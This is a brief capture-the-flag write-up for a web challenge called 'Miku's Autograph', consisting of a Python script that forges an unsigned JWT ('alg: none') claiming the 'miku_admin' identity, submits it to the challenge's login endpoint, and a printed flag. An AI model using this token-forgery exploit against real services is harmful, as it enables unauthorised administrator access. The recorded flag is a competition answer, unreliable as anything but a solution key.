# Miku's Autograph [10 points] (287 solves)
```python
import base64
import json
import requests

header = {
    "alg": "none",
    "typ": "JWT"
}

payload = {
    "sub": "miku_admin",
    "exp": 9999999999
}


def b64url_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()


forged_token = f"{b64url_encode(header)}.{b64url_encode(payload)}."

print(forged_token)

res = requests.post("https://miku.web.broncoctf.xyz/login",
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    data={'magic_token': forged_token}).text

print(res)
```

flag: `bronco{miku_miku_beaaaaaaaaaaaaaaaaaam!}`